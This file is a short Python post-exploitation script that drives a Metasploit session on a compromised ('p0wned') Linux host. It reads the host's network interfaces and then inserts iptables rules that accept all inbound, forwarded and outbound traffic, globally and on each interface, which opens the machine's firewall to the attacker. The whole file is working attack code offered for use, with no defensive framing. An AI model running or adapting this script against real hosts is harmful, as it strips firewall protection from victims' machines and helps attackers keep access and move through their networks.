from metasploit.msfrpc import MsfRpcClient

def remote_host_netinfo(client:MsfRpcClient, metasploitSessionNum:int):
    try:
        #Create variable to interact with p0wned box's shell
        shell = client.sessions.session(metasploitSessionNum)

        #Issue bash command to carve all interfaces existing on a host
        shell.write("ip a | cut -d \" \" -f 2 | cut -d \":\" -f 1 | grep -v \"lo\" | grep .\n")

        #Save shell output to shell_output
        shell_output = shell.read()

        #Create an array of interfaces retrieved from previous command and save array to variable interfaces
        interfaces = shell_output.split('\n')

        #MWrite general IPTABLES rules accept all traffic in shell
        shell.write("iptables -I INPUT -p all -j ACCEPT\n")     #INPUT
        shell.write("iptables -I FORWARD -p all -j ACCEPT\n")   #FORWARD
        shell.write("iptables -I OUTPUT -p all -j ACCEPT\n")    #OUTPUT

        #Make first rules of specific interfaces' Inbound and Output Chains accept all traffic
        for interface in interfaces:    #Loop through all interfaces
            shell.write("iptables -I INPUT -i {0} -p all -j ACCEPT\n".format(interface))    #INPUT for specific interface
            shell.write("iptables -I FORWARD -i {0} -p all -j ACCEPT\n".format(interface))  #FORWARD for specific interface

        return 0

    except:
        return -1

